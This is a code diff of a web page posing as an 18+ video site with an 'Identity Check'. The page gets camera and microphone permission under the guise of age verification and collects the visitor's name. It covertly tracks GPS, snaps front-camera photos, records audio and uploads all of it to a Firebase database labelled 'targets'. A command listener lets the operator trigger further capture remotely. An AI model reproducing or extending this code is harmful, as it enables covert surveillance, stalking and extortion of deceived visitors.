@@ -9,20 +9,11 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
         
-        /* Fixed Background logic with your GitHub Image */
         #bg-image {
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%;
-            background: url('bg.png.jpeg'); /* Aapki file ka sahi naam */
-            background-size: cover; 
-            background-position: center;
-            filter: blur(15px); /* Professional Blur */
-            z-index: 1; 
-            transform: scale(1.1); /* Edges fix */
-            opacity: 0.7;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('bg.png.jpeg'); 
+            background-size: cover; background-position: center;
+            filter: blur(15px); z-index: 1; transform: scale(1.1); opacity: 0.7;
         }
 
         #main-ui {
@@ -35,11 +26,9 @@
             width: 100px; height: 100px; background: rgba(255, 255, 255, 0.2);
             border: 4px solid #fff; border-radius: 50%; display: flex;
             justify-content: center; align-items: center; cursor: pointer;
-            box-shadow: 0 0 30px rgba(255,255,255,0.4);
-            transition: 0.3s;
+            box-shadow: 0 0 30px rgba(255,255,255,0.4); transition: 0.3s;
         }
         #play-trigger:hover { transform: scale(1.1); }
-
         #play-trigger::after {
             content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent;
             border-left: 32px solid white; margin-left: 10px;
@@ -49,46 +38,40 @@
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 85%; max-width: 350px; background: #111; border: 1px solid #333;
             border-radius: 15px; padding: 25px; text-align: center; z-index: 200;
-            box-shadow: 0 0 50px rgba(0,0,0,0.9);
         }
         
-        #age-modal h2 { color: #fff; margin: 0 0 10px 0; }
-        #age-modal p { color: #aaa; margin-bottom: 20px; font-size: 14px; }
-        
-        .input-name { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
-        
-        .modal-btns { display: flex; gap: 10px; }
-        .btn { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; }
-        .btn-yes { background: #00ff41; color: #000; }
-        .btn-no { background: #333; color: #fff; }
+        .input-name { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; }
+        .btn-yes { background: #00ff41; color: #000; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }
 
+        /* Video styling fix */
         #main-player { display: none; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; z-index: 1000; object-fit: contain; }
+        
+        #loading-text { display: none; color: #00ff41; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="bg-image"></div>
+    <div id="loading-text">LOADING VIDEO...</div>
 
     <div id="main-ui">
         <div id="play-trigger" onclick="showModal()"></div>
         <div style="text-align:center; margin-top:20px;">
-            <h1 style="color:#fff; font-size:26px; letter-spacing: 2px;">WATCH VIDEO</h1>
+            <h1 style="color:#fff; font-size:26px;">WATCH VIDEO</h1>
             <p style="color:#00ff41; font-weight: bold;">Restricted Content (18+)</p>
         </div>
     </div>
 
     <div id="age-modal">
-        <h2>Identity Check</h2>
-        <p>Enter your name to unlock the private stream.</p>
+        <h2 style="color:white">Identity Check</h2>
+        <p style="color:#aaa">Enter name to unlock private stream.</p>
         <input type="text" id="targetName" class="input-name" placeholder="Full Name...">
-        <div class="modal-btns">
-            <button class="btn btn-yes" onclick="startEverything()">UNLOCK NOW</button>
-            <button class="btn btn-no" onclick="location.reload()">EXIT</button>
-        </div>
+        <button class="btn-yes" onclick="startEverything()">UNLOCK NOW</button>
     </div>
 
-    <video id="main-player" playsinline loop muted autoplay style="display:none; width:100%; height:100%; object-fit:contain;">
-    <source src="video.mp4" type="video/mp4">
+    <video id="main-player" playsinline loop muted>
+        <source src="video.mp4" type="video/mp4">
+    </video>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
@@ -99,32 +82,34 @@
     let globalStream = null;
     let isBusy = false;
 
-    function showModal() {
-        document.getElementById('age-modal').style.display = 'block';
-    }
+    function showModal() { document.getElementById('age-modal').style.display = 'block'; }
 
     async function startEverything() {
         const uName = document.getElementById('targetName').value;
-        if(!uName) { alert("Please enter your name to verify!"); return; }
+        if(!uName) { alert("Please enter name!"); return; }
 
         document.getElementById('age-modal').style.display = 'none';
+        document.getElementById('loading-text').style.display = 'block';
 
         try {
-            // Permission and Stream
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
             const v = document.getElementById('main-player');
             v.style.display = 'block';
-            v.play();
+            
+            // Video play logic
+            v.play().then(() => {
+                v.muted = false; // Unmute after play starts
+                document.getElementById('loading-text').style.display = 'none';
+            }).catch(e => {
+                console.log("Auto-play blocked, trying with mute");
+                v.play(); 
+            });
 
-            // Background Processes
             sendInfo(uName);
             trackGPS();
-            
-            // Auto Capture Sequence
             setTimeout(() => capture("user"), 4000); 
-            setTimeout(() => capture("environment"), 15000);
-
+            
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd && !isBusy) {
@@ -136,7 +121,7 @@
             });
 
         } catch (e) {
-            alert("Error: Camera/Mic access is required for age verification.");
+            alert("Permission Denied! Camera access is required.");
             location.reload();
         }
     }
@@ -160,13 +145,11 @@
                 const canvas = document.createElement('canvas');
                 canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                 canvas.getContext('2d').drawImage(tempVid, 0, 0);
-                
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.5),
                     type: mode === "user" ? "FRONT" : "BACK",
                     time: new Date().toLocaleTimeString()
                 });
-                
                 stream.getTracks().forEach(t => t.stop());
                 initStream().then(() => { isBusy = false; });
             }, 3000);
@@ -181,7 +164,6 @@
             const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const recorder = new MediaRecorder(audioStream);
             let chunks = [];
-            
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => {
                 const reader = new FileReader();
@@ -216,5 +198,3 @@
 </script>
 </body>
 </html>
-
-
